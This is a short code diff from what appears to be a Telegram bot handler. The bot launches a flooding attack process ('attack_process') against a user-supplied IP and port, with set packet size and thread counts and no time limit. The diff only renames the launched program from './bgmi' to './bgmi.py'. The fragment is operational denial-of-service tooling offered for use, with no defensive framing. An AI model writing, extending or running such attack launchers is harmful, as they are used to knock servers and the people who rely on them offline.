@@ -102,7 +102,7 @@ async def handle_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # No duration so runs until manually stopped
         packet_size = 100
         threads = 100
-        command = ["./bgmi", ip, str(port), "9999", str(packet_size), str(threads)]
+        command = ["./bgmi.py", ip, str(port), "9999", str(packet_size), str(threads)]
 
         attack_process = subprocess.Popen(command)
 
